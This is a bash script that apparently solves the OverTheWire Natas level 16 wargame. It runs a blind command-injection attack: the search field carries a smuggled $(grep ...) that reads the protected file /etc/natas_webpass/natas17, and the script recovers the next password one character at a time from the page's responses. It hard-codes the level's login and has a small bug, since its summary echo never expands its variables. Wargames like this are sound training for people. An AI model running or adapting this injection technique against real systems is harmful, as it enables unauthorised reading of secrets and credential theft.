alphabet='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
relevant_alphabet=''
currentpw=''

# filter the alphabet for chars actually in the pw
for i in {0..61}; do
    trying=${alphabet:${i}%62:1};
    isinside=$(curl --silent \
        --user natas16:WaIHEacj63wnNIBROHeqi3p9t0m5nhmh \
        --data needle=africans%24%28grep+${trying}+-+%3C+%2Fetc%2Fnatas_webpass%2Fnatas17%29 \
        http://natas16.natas.labs.overthewire.org/?submit=Search |
        grep -i africans);
    if [[ -z "$isinside" ]]; then relevant_alphabet+="${trying}"; echo "[+]${trying}"; fi
done

# show the working alphabet
echo '[+] Working alphabet: ${relevant_alphabet} (${#relevant_alphabet})';

# loop only on the relevant characters
for i in {0..1000}; do
    trying=${relevant_alphabet:${i}%${#relevant_alphabet}:1};
    isinside=$(curl --silent \
        --user natas16:WaIHEacj63wnNIBROHeqi3p9t0m5nhmh \
        --data needle=africans%24%28grep+%5E${currentpw}${trying}+-+%3C+%2Fetc%2Fnatas_webpass%2Fnatas17%29 \
        http://natas16.natas.labs.overthewire.org/?submit=Search |
        grep -i africans);
    if [[ -z "$isinside" ]]; then currentpw+="${trying}"; echo "[+]${currentpw}"; fi
done
